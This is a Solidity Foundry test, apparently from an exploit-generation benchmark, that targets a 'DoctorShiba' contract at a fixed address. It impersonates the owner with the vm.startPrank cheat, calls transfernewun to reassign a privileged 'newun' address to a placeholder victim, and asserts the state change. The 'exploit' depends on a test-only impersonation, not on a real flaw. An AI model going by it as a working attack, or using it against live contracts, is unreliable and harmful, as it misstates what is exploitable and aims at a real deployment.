// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface DoctorShiba {
    function owner() external view returns (address);
    function transfernewun(address _newun) external;
    function newun() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        victim = address(0x1234567890123456789012345678901234567890); // Example victim address
        vm.label(victim, "Victim");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address contractOwner = DoctorShiba(TARGET).owner();
        vm.label(contractOwner, "Contract Owner");

        // Impersonate the owner
        vm.startPrank(contractOwner);

        // Call transfernewun with victim address
        DoctorShiba(TARGET).transfernewun(victim);

        vm.stopPrank();

        // Verify that newun is set to victim address
        address currentNewun = DoctorShiba(TARGET).newun();
        require(currentNewun == victim, "newun not set to victim address");

        // The oracle will check: newun == victim_address
        // We've successfully set it, so the test should pass
        assertEq(currentNewun, victim, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
